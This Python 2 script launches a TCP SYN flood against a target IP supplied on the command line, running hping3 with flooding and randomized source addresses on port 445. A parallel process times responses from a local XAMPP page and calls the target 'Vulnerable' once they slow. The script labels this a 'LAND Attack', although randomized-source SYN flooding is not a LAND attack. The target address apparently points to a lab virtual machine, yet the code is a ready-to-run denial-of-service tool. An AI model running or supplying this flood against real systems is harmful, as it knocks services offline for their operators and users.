#!/usr/bin/env python
from __future__ import print_function
from threading import Thread
from SocketServer import ThreadingMixIn
import multiprocessing
import socket, sys, os
import urllib
import time

def url_resp():
	i = 0
	while i < 2:
		#time.sleep(1)
		url = "http://192.168.56.102/xampp/"
		start = time.time()
		op = urllib.urlopen(url)
		page = op.read()
		end = time.time()
		t_time = end-start
		print("-> Response time for connecting %s is %.4f seconds"%(url, t_time))
		if(t_time<2):
			print("######################################")
			print("** The System is >Not< Vulnerable at present**")
			print("######################################")
			pass
		
		else:
			print("######################################")
			print("** The System is ^Vulnerable^ to the LAND Attack practised **")
			print("######################################")
			sys.exit(1)
		#op.close()
		i+=1
		time.sleep(10)
#url_resp()
def target_attack(): 
	print("-> Starting LAND Attack i.e. flooding TCP SYN packets to the target")
	cmd = "sudo hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source "+sys.argv[1]
	os.system(cmd)

#url_resp()
if __name__ == '__main__':
	try:	
		p1 = multiprocessing.Process(target=url_resp, args=())
		p2 = multiprocessing.Process(target=target_attack, args=())
		p1.start()
		time.sleep(1)
		p2.start()
		p1.join()
		p2.join()

	except SystemExit,KeyboardInterrupt:
		print('Done')
		sys.exit(0)